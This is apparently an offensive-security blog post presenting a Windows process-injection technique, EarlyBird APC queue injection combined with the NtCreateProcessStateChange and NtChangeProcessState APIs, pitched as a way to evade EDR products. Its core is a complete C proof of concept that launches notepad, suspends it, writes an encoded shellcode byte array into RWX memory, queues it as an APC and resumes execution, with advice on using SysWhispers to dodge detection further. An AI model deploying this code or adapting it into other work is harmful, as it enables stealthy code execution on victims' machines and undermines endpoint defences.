---
layout: post
title: EarlyBird APC Queue Injection With a ProcessStateChange Twist
tags: []
---



Relatively recently, Yarden Shafir made a blog post about a new way to evade the EDRs for process injection. In the blog post, Yarden mentions that there are new added features in the recent Windows 10 build(Insider) and Windows 11 as well. Some of them are NtCreateProcessStateChange/ NtCreateThreadStateChange and NtChangeProcessState/NtChangeThreadState.

These WINAPI calls were added to resolve the issue of what happens if a process suspends a thread and then terminates it before resuming it. To quote Yarden:

Unless some other part of the system realizes what happened, the thread will remain suspended forever and will never resume its execution. To solve that, this new feature allows suspending and resuming threads and processes through the new object types, which will keep track of the suspension state of the threads or processes. That way, when the object is destroyed (for example, when the process that created it is terminated), the system will reset the state of the target process or thread by suspending or resuming it as needed.

Yarden has made a PoC at the bottom of the blog potentially continuing a suspended thread, due to these aforementioned new WINAPI calls, a suspended application can now resume or reset. By using DuplicateHandle and getting the second notepad a handle to the first suspended notepad, the suspended notepad remains as is until the second notepad closes and resumes the first notepad without using ResumeThread.


Evading common process injection patterns for WINAPI calls can definitely trick some EDRs. Although I took a different approach in my PoC and followed the pattern of EarlyBird APC Queue Injection and instead of creating a suspended process, allocate shellcode and ResumeThread, I created a process, suspended it with NtCreateProcessStateChange, allocated the shellcode and then changed the suspended state back with NtChangeProcessState to continue the primary thread.

Obviously the below code will be detected due to the shellcode, VirtualAlloc, WriteProcessMemory, QueueUserAPC but SysWhispers can help you replace that will the ntdll's WINAPI calls for better results.

PoC:

[![](https://trickster0.files.wordpress.com/2021/08/poc.png?w=1024)](https://trickster0.files.wordpress.com/2021/08/poc.png)

<pre>
  <code class="C">
#include &lt;Windows.h>
#include &lt;stdio.h>
#include &lt;winternl.h>

typedef NTSTATUS(__fastcall* NtCreateProcessStateChange)(OUT PHANDLE StateChangeHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN HANDLE ProcessHandle, IN INT Unknown);
typedef NTSTATUS(__fastcall* NtChangeProcessState)(IN HANDLE StateChangeHandle, IN HANDLE ProcessHandle, IN ULONG Action, IN ULONG64 Unknown1, IN ULONG64 Unknown2, IN ULONG64 Unknown3);

void main()
{
    HANDLE stateChangeHandle;
    PROCESS_INFORMATION procInfo;
    PROCESS_INFORMATION procInfo2;
    STARTUPINFO startInfo;
    BOOL result;
    NTSTATUS status;
    NtCreateProcessStateChange	pNtCreateProcessStateChange;
    NtChangeProcessState        pNtChangeProcessState;
    HMODULE                     hNtdll;
    unsigned char buf[] = "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x4f\x6c\xaf\x32\x7e\xe4\xec\x88\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb3\x24\x2c\xd6\x8e\x0c\x2c\x88\x4f\x6c\xee\x63\x3f\xb4\xbe\xd9\x19\x24\x9e\xe0\x1b\xac\x67\xda\x2f\x24\x24\x60\x66\xac\x67\xda\x6f\x24\x24\x40\x2e\xac\xe3\x3f\x05\x26\xe2\x03\xb7\xac\xdd\x48\xe3\x50\xce\x4e\x7c\xc8\xcc\xc9\x8e\xa5\xa2\x73\x7f\x25\x0e\x65\x1d\x2d\xfe\x7a\xf5\xb6\xcc\x03\x0d\x50\xe7\x33\xae\x6f\x6c\x00\x4f\x6c\xaf\x7a\xfb\x24\x98\xef\x07\x6d\x7f\x62\xf5\xac\xf4\xcc\xc4\x2c\x8f\x7b\x7f\x34\x0f\xde\x07\x93\x66\x73\xf5\xd0\x64\xc0\x4e\xba\xe2\x03\xb7\xac\xdd\x48\xe3\x2d\x6e\xfb\x73\xa5\xed\x49\x77\x8c\xda\xc3\x32\xe7\xa0\xac\x47\x29\x96\xe3\x0b\x3c\xb4\xcc\xc4\x2c\x8b\x7b\x7f\x34\x8a\xc9\xc4\x60\xe7\x76\xf5\xa4\xf0\xc1\x4e\xbc\xee\xb9\x7a\x6c\xa4\x89\x9f\x2d\xf7\x73\x26\xba\xb5\xd2\x0e\x34\xee\x6b\x3f\xbe\xa4\x0b\xa3\x4c\xee\x60\x81\x04\xb4\xc9\x16\x36\xe7\xb9\x6c\x0d\xbb\x77\xb0\x93\xf2\x7a\xc4\xe5\xec\x88\x4f\x6c\xaf\x32\x7e\xac\x61\x05\x4e\x6d\xaf\x32\x3f\x5e\xdd\x03\x20\xeb\x50\xe7\xc5\x14\x59\x2a\x19\x2d\x15\x94\xeb\x59\x71\x77\x9a\x24\x2c\xf6\x56\xd8\xea\xf4\x45\xec\x54\xd2\x0b\xe1\x57\xcf\x5c\x1e\xc0\x58\x7e\xbd\xad\x01\x95\x93\x7a\x51\x1f\x88\x8f\xa6\x2a\x14\xca\x32\x7e\xe4\xec\x88";
    SIZE_T shellSize = sizeof(buf);
    stateChangeHandle = nullptr;
    ZeroMemory(&startInfo, sizeof(startInfo));
    startInfo.cb = sizeof(startInfo);
    result = CreateProcess(L"C:\\Windows\\System32\\notepad.exe",NULL,NULL,NULL,FALSE,0,NULL,NULL,&startInfo,&procInfo);
    HANDLE victimProcess = procInfo.hProcess;
    HANDLE threadHandle = procInfo.hThread;
    hNtdll = GetModuleHandle(L"ntdll.dll");
    pNtCreateProcessStateChange = (NtCreateProcessStateChange)GetProcAddress(hNtdll, "NtCreateProcessStateChange");
    status = pNtCreateProcessStateChange(&stateChangeHandle, MAXIMUM_ALLOWED, NULL, procInfo.hProcess, 0);
    pNtChangeProcessState = (NtChangeProcessState)GetProcAddress(hNtdll, "NtChangeProcessState");
    status = pNtChangeProcessState(stateChangeHandle, procInfo.hProcess, 0, NULL, 0, 0);
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    status = pNtChangeProcessState(stateChangeHandle, procInfo.hProcess, 1, NULL, 0, 0);
}
  </code>
</pre>

Sources:



EarlyBird APC Queue Injection - https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection


NtCreateProcessChangeState Blog Post - https://windows-internals.com/thread-and-process-state-change/


NtCreateProcessChangeState gist example - https://gist.github.com/DownWithUp/80a3b7b6a198788e79d8b508463e9384
